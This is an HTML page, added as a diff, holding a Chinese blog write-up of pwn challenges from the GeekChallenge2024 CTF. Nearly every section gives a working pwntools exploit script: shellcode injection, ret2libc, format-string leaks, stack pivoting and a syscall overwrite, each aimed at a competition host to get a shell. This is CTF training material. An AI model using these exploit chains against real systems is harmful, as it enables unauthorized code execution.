@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>haoo&#39;s tech blog - GeekChallenge2024</title>
+<meta name="description" content="ez_shellcode简单的shellcode from pwn import*context.arch=&amp;#x27;amd64&amp;#x27;io=remote(&amp;#x27;nc1.ctfplus.cn&amp;#x27;,39373)shellcode_addr=0x0401256shellcode=asm(shellcra">
+<meta name="theme-color" content="#090c0b">
+<meta name="color-scheme" content="dark">
+<script>
+  (function () {
+    try {
+      var palette = localStorage.getItem('startrace-palette');
+      if (['green', 'cyan', 'amber'].includes(palette)) document.documentElement.dataset.palette = palette;
+    } catch (error) {}
+  })();
+</script>
+<link rel="stylesheet" href="/css/main.css">
+
+  <link rel="alternate" type="application/rss+xml" title="haoo&#39;s tech blog RSS" href="/rss.xml">
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body class="site-body">
+  
+  <header class="site-header">
+  <a class="skip-link" href="#main-content">跳到正文</a>
+  <div class="site-header__inner">
+    <a class="site-brand" href="/" aria-label="haoo&#39;s tech blog 首页">
+      <span class="site-brand__mark" aria-hidden="true">0x</span>
+      <span class="site-brand__text">
+        <strong>haoo&#39;s tech blog</strong>
+      </span>
+    </a>
+
+    <nav id="site-nav" class="site-nav" aria-label="主导航">
+      
+      
+        <a class="site-nav__link" href="/">首页</a>
+      
+        <a class="site-nav__link" href="/categories">知识库</a>
+      
+        <a class="site-nav__link" href="/tags">标签</a>
+      
+        <a class="site-nav__link" href="/about">关于</a>
+      
+        <a class="site-nav__link" href="/links">链接</a>
+      
+        <a class="site-nav__link" href="/rss.xml">RSS</a>
+      
+    </nav>
+
+    <button class="command-toggle" type="button" data-command-open aria-label="打开命令行" aria-keyshortcuts="Control+K">
+      <span aria-hidden="true">&gt;_</span>
+      <span>Console</span>
+      <kbd>Ctrl K</kbd>
+    </button>
+
+    <button class="palette-toggle" type="button" data-palette-toggle aria-label="切换主题配色" title="切换主题配色">
+      <span class="palette-toggle__swatch" aria-hidden="true"></span>
+      <span data-palette-label>绿色</span>
+    </button>
+
+    <button class="menu-toggle" type="button" aria-label="打开导航" aria-expanded="false" aria-controls="site-nav">
+      <span></span>
+      <span></span>
+      <span></span>
+    </button>
+  </div>
+  <div class="reading-progress" aria-hidden="true"><span></span></div>
+</header>
+
+
+  <main id="main-content" class="site-main article-main">
+    <article class="article-wrap">
+      <header class="article-header">
+        <div class="post-meta">
+          <span>6423 字</span>
+        </div>
+        <h1>GeekChallenge2024</h1>
+        
+          <div class="tag-list">
+            
+              <a class="tag-chip tag-chip--solid" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
+            
+            
+              <a class="tag-chip" href="/tags/ctf/">ctf</a>
+            
+          </div>
+        
+      </header>
+
+      <div class="article-grid">
+        <div class="article-body article-prose" id="article-content">
+          <h1 id="ez-shellcode"><a href="#ez-shellcode" class="headerlink" title="ez_shellcode"></a>ez_shellcode</h1><p>简单的shellcode</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>context.arch=&#x27;amd64&#x27;<br>io=remote(&#x27;nc1.ctfplus.cn&#x27;,39373)<br><br>shellcode_addr=0x0401256<br>shellcode=asm(shellcraft.sh())<br>io.send(shellcode)<br><br>payload=cyclic(0x18+8)+p64(shellcode_addr)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h1 id="你会栈溢出吗？"><a href="#你会栈溢出吗？" class="headerlink" title="你会栈溢出吗？"></a>你会栈溢出吗？</h1><p>简单的64位栈溢出，注意堆栈平衡</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;nc1.ctfplus.cn&#x27;,23262)<br><br>ret=0x040057e<br><br>payload=cyclic(0xC+8)+p64(ret)+p64(0x400728)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h1 id="买黑吗喽了么"><a href="#买黑吗喽了么" class="headerlink" title="买黑吗喽了么"></a>买黑吗喽了么</h1><p><img src="/images/GeekChallenge2024_%E4%B9%B0%E9%BB%91%E5%90%97%E5%96%BD%E4%BA%86%E4%B9%88_1.png"></p>
+<p>一道菜单题，输入1进入购买，输入2查看余额，输入3写反馈。</p>
+<p><img src="/images/GeekChallenge2024_%E4%B9%B0%E9%BB%91%E5%90%97%E5%96%BD%E4%BA%86%E4%B9%88_2.png"></p>
+<p><img src="/images/GeekChallenge2024_%E4%B9%B0%E9%BB%91%E5%90%97%E5%96%BD%E4%BA%86%E4%B9%88_3.png"></p>
+<p>不断进行购买至负数，然后余额就会变成非常大的正数，就能输入%p泄漏基址，接着进入反馈函数打ret2libc</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>context.arch=&#x27;amd64&#x27;<br>elf=ELF(&#x27;./syscall&#x27;)<br>libc=ELF(&#x27;./syscalllibc.so.6&#x27;)<br>io=remote(&#x27;nc1.ctfplus.cn&#x27;,35338)<br><br>for _ in range(9):<br>    io.sendlineafter(b&quot;choice:&quot;,b&quot;1&quot;)<br>    io.sendlineafter(b&quot;choice:&quot;,b&quot;1&quot;)<br><br>io.sendlineafter(b&quot;choice:&quot;,b&quot;1&quot;)<br>io.sendlineafter(b&quot;choice:&quot;,b&quot;2&quot;)<br><br>io.sendlineafter(b&quot;choice:&quot;,b&quot;2&quot;)<br>io.send(b&quot;%p&quot;)<br><br>io.recvuntil(b&quot;0x0x&quot;)<br>base=int(io.recv(12),16)-0x4090<br>print(hex(base))<br><br>rdi=base+0x11f1<br>ret=base+0x101a<br>puts_plt=base+elf.plt[&#x27;puts&#x27;]<br>puts_got=base+elf.got[&#x27;puts&#x27;]<br><br>io.sendlineafter(b&quot;choice:&quot;,b&quot;3&quot;)<br>payload=cyclic(0x50+8)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(base+0x14BC)<br>io.sendlineafter(b&quot;feedback:&quot;,payload)<br><br>puts=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>print(hex(puts))<br><br>libc_base=puts-libc.sym[&#x27;puts&#x27;]<br>system=libc_base+libc.sym[&#x27;system&#x27;]<br>bin_sh=libc_base+next(libc.search(&#x27;/bin/sh\x00&#x27;))<br><br>payload=cyclic(0x50+8)+p64(ret)+p64(rdi)+p64(bin_sh)+p64(system)+p64(0)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h1 id="简单的签到"><a href="#简单的签到" class="headerlink" title="简单的签到"></a>简单的签到</h1><p>简答的计算，接收两个数并进行计算即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;nc1.ctfplus.cn&#x27;,31333)<br><br>io.sendafter(b&quot;challenge.&quot;,b&quot;\n&quot;)<br><br>v2=int(io.recvuntil(&quot;*&quot;,drop=True))<br>v3=int(io.recvuntil(&quot;=&quot;,drop=True))<br><br>v4=v2*v3<br><br>io.sendline(str(v4))<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<h1 id="00000"><a href="#00000" class="headerlink" title="00000"></a>00000</h1><p><img src="/images/GeekChallenge2024_00000.png"></p>
+<p>输入的密码与程序随机生成的密码一致则获得flag，写脚本爆破即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import *<br><br>filename = &#x27;./00000&#x27;<br><br>context(arch = &#x27;amd64&#x27;, log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;)<br><br>for i in range(256):<br>    io = remote(&#x27;nc1.ctfplus.cn&#x27;,26368)<br>    try:<br>        io.sendline(b&#x27;\x00&#x27;)<br>        io.recvuntil(&#x27;&#123;&#x27;, timeout = 0.3)<br>        io.interactive()<br>    except:<br>        continue<br>    finally:<br>        io.close()<br><br></code></pre></td></tr></table></figure>
+
+<h1 id="over-flow"><a href="#over-flow" class="headerlink" title="over_flow??"></a>over_flow??</h1><p><img src="/images/GeekChallenge2024_over_flow1.png"></p>
+<p><img src="/images/GeekChallenge2024_over_flow2.png"></p>
+<p>存在一个函数，输入的filename会溢出一个字节可以修改open_fd</p>
+<p><img src="/images/GeekChallenge2024_over_flow3.png"></p>
+<p>存在系统调用，修改open_fd的值为想要调用的系统调用号，比如修改为0x3b，进行execve(‘&#x2F;bin&#x2F;sh’,0,0)，而filename作为第一个参数，因此可以输入&#x2F;bin&#x2F;sh</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;nc1.ctfplus.cn&#x27;,26196)<br>io.sendline(b&#x27;2&#x27;)<br>payload=b&#x27;/bin/sh\x00&#x27;+b&#x27;\x3b&#x27;<br>io.sendline(payload)<br>io.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h1 id="这里的空间有点小啊"><a href="#这里的空间有点小啊" class="headerlink" title="这里的空间有点小啊"></a>这里的空间有点小啊</h1><p>打栈迁移。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>context.arch=&#x27;amd64&#x27;<br>elf=ELF(&#x27;./zhanqianyi&#x27;)<br>libc=ELF(&#x27;./zhanqianyilibc.so.6&#x27;)<br>io=remote(&#x27;nc1.ctfplus.cn&#x27;,34571)<br><br>bss=0x0601530<br>read=0x040071C<br>puts_plt=elf.plt[&#x27;puts&#x27;]<br>puts_got=elf.got[&#x27;puts&#x27;]<br>leave=0x0400738<br>rdi=0x0400853<br>ret=0x0400566<br><br>io.sendlineafter(b&quot;&gt;&gt;\n&quot;,b&#x27;1&#x27;)<br><br>payload=b&#x27;a&#x27;*(0x30)+p64(bss)+p64(read)<br>io.sendafter(&#x27;something\n&#x27;,payload)<br><br>payload=p64(bss+0x100)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(read)+b&#x27;/bin/sh\x00&#x27;+p64(bss-0x30)+p64(leave)<br>io.send(payload)<br>puts=u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))<br>print(hex(puts))<br>libc_base=puts-libc.sym[&#x27;puts&#x27;]<br>system=libc_base+libc.sym[&#x27;system&#x27;]<br>bin_sh=bss-0x30+0x28<br><br>payload=p64(bss+0x50)+p64(ret)+p64(rdi)+p64(bin_sh)+p64(system)+p64(0)+p64(bss+0x100-0x30)+p64(leave)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<h1 id="Black-myth-Wukong"><a href="#Black-myth-Wukong" class="headerlink" title="Black_myth_Wukong"></a>Black_myth_Wukong</h1><p>一道64位题目，开启了NX与PIE保护</p>
+<p><img src="/images/GeekChallenge2024_Black_myth_Wukong_1.png"></p>
+<p>这里可以泄漏libc（但具体的偏移是怎么弄出来的还没弄明白）。</p>
+<p><img src="/images/GeekChallenge2024_Black_myth_Wukong_2.png"></p>
+<p><img src="/images/GeekChallenge2024_Black_myth_Wukong_3.png"></p>
+<p><img src="/images/GeekChallenge2024_Black_myth_Wukong_4.png"></p>
+<p>当我们输入后会连续执行两个函数，这里存在类似栈迁移的东西。最后的echo_inner函数会将rbp的最后一位变为0，就有可能使得rbp变小，变小后就会执行one_gadget。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>libc=ELF(&#x27;./Black_myth_Wukonglibc.so.6&#x27;)<br>elf=ELF(&#x27;./Black_myth_Wukong&#x27;)<br>#io=remote(&#x27;nc1.ctfplus.cn&#x27;,48844)<br>io=process(&#x27;./Black_myth_Wukong&#x27;)<br><br>gdb.attach(io)<br><br>io.send(b&#x27;\n&#x27;)<br>io.sendline(b&#x27;19&#x27;)<br>io.recvuntil(&#x27;it: &#x27;)<br>libc_base=int(io.recv(12),16)-0x80b12<br>print(hex(libc_base))<br><br>io.sendline(b&#x27;256&#x27;)<br>one_gadget=libc_base+0x4f29e<br>io.send(p64(one_gadget)*32)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>还是比较简单的，感觉还是自己的基础不够，还是得提高自己的基础知识</p>
+<h1 id="SU"><a href="#SU" class="headerlink" title="SU___"></a>SU___</h1><p>一道简单的ret2libc。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>elf=ELF(&#x27;./su&#x27;)<br>libc=ELF(&#x27;./sulibc.so.6&#x27;)<br>io=remote(&#x27;nc1.ctfplus.cn&#x27;,45259)<br><br>puts_plt=elf.plt[&#x27;puts&#x27;]<br>puts_got=elf.got[&#x27;puts&#x27;]<br>addr=0x0400798<br>rdi=0x0400903<br>rsi_r15=0x0400901<br>ret=0x04005d6<br><br>io.sendline(b&#x27;1&#x27;)<br>payload=cyclic(0x80+8)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(addr)<br>io.sendline(payload)<br>puts=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>print(hex(puts))<br><br>libc_base=puts-libc.sym[&#x27;puts&#x27;]<br>system=libc_base+libc.sym[&#x27;system&#x27;]<br>bin_sh=libc_base+next(libc.search(&#x27;/bin/sh&#x27;))<br><br>payload=cyclic(0x80+8)+p64(ret)+p64(rdi)+p64(bin_sh)+p64(system)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<h1 id="我的空调呢"><a href="#我的空调呢" class="headerlink" title="我的空调呢"></a>我的空调呢</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>elf=ELF(&#x27;./air_conditioner&#x27;)<br>libc=ELF(&#x27;./air_conditionerlibc.so.6&#x27;)<br>io=remote(&#x27;nc1.ctfplus.cn&#x27;,41776)<br>#io=process(&#x27;./air_conditioner&#x27;)<br><br>io.sendline(b&#x27;5&#x27;)<br>io.sendline(b&#x27;0x0404018&#x27;)<br>puts=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>print(hex(puts))<br><br>libc_base=puts-libc.sym[&#x27;puts&#x27;]<br>system=libc_base+libc.sym[&#x27;system&#x27;]<br>printf=libc_base+libc.sym[&#x27;printf&#x27;]<br><br>io.sendlineafter(b&#x27;chioce&gt;:&#x27;,b&#x27;4&#x27;)<br>io.sendline(b&#x27;-4&#x27;)<br><br>io.send(p64(0)+p64(printf)+p64(system))<br><br>io.sendlineafter(b&#x27;chioce&gt;:&#x27;,b&#x27;1&#x27;)<br>io.sendafter(b&#x27;name:&#x27;,b&#x27;/bin/sh\x00&#x27;)<br>io.sendafter(b&#x27;Introduce:&#x27;,b&#x27;a&#x27;)<br><br>io.sendlineafter(b&#x27;chioce&gt;:&#x27;,b&#x27;3&#x27;)<br>io.sendline(b&#x27;0&#x27;)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<h1 id="真能走到后门吗"><a href="#真能走到后门吗" class="headerlink" title="真能走到后门吗"></a>真能走到后门吗</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>#io=remote(&#x27;nc1.ctfplus.cn&#x27;,37845)<br>io=process(&#x27;./fmt&#x27;)<br><br>io.sendlineafter(b&#x27;your ID:&#x27;,b&#x27;haoo&#x27;)<br>io.sendlineafter(b&#x27;name?&#x27;,b&#x27;%13$p+%14$p&#x27;)<br>io.recvuntil(&#x27;0x&#x27;)<br>canary=int(io.recv(16),16)<br>print(hex(canary))<br>io.recvuntil(&#x27;0x&#x27;)<br>rbp=int(io.recv(12),16)<br>print(hex(rbp))<br><br>ret=rbp-0x18<br><br>gdb.attach(io)<br><br>io.send(p64(ret + 1) + b&#x27;A&#x27; * 0x30 + p64(canary) + p64(rbp)+ b&#x27;\xEC&#x27;)<br>sleep(0.1)<br><br>io.send(b&#x27;%18c%6$hhn&#x27;)<br>sleep(0.1)<br>io.send(b&#x27;A&#x27; * 0x38 + p64(canary) + p64(rbp)+ b&#x27;\x82&#x27;)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+
+        </div>
+
+        
+          <aside class="toc-panel" aria-label="文章目录">
+            <div class="toc-panel__head">
+              <h2>目录</h2>
+              <button class="toc-top" type="button">顶部</button>
+            </div>
+            <nav id="toc"></nav>
+          </aside>
+        
+      </div>
+
+      <nav class="article-nav" aria-label="文章导航">
+        
+          <a href="/nss_pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">
+            <span>上一篇</span>
+            <strong>nss刷题记录</strong>
+          </a>
+        
+        
+          <a href="/XYNU2024%E4%BF%A1%E5%AE%89%E6%9D%AF/">
+            <span>下一篇</span>
+            <strong>XYNU2024信安杯</strong>
+          </a>
+        
+      </nav>
+    </article>
+  </main>
+
+  <footer class="site-footer">
+  <div class="site-footer__inner">
+    <p><strong>haoo&#39;s tech blog</strong><span aria-hidden="true"> / </span>31 篇记录<span aria-hidden="true"> / </span><a href="/rss.xml">RSS</a></p>
+    <p>&copy; haoo · powered by Hexo</p>
+  </div>
+</footer>
+<dialog
+  id="command-console"
+  class="command-console"
+  aria-labelledby="command-title"
+  data-search-url="/search.json"
+  data-home-url="/"
+  data-categories-url="/categories"
+  data-tags-url="/tags"
+  data-about-url="/about"
+  data-links-url="/links"
+>
+  <div class="command-console__bar">
+    <div>
+      <span class="command-console__status" aria-hidden="true"></span>
+      <strong id="command-title">haoo@blog:~</strong>
+    </div>
+    <button class="command-console__close" type="button" data-command-close aria-label="关闭命令行">ESC</button>
+  </div>
+
+  <div id="command-output" class="command-console__output" role="log" aria-live="polite" aria-relevant="additions">
+    <div class="command-message command-message--accent">Startrace interactive shell v1.0</div>
+    <div class="command-message">输入 <code>help</code> 查看命令，按 <kbd>Ctrl K</kbd> 随时打开。</div>
+  </div>
+
+  <form id="command-form" class="command-console__form" autocomplete="off">
+    <label for="command-input"><span aria-hidden="true">visitor@blog:~$</span><span class="visually-hidden">输入命令</span></label>
+    <input id="command-input" name="command" type="text" inputmode="text" autocapitalize="off" spellcheck="false" aria-describedby="command-hint">
+    <span class="command-console__cursor" aria-hidden="true"></span>
+  </form>
+  <p id="command-hint" class="command-console__hint">help · ls · cd · open · search · clear</p>
+</dialog>
+
+<script src="/js/theme.js" defer></script>
+
+</body>
+</html>
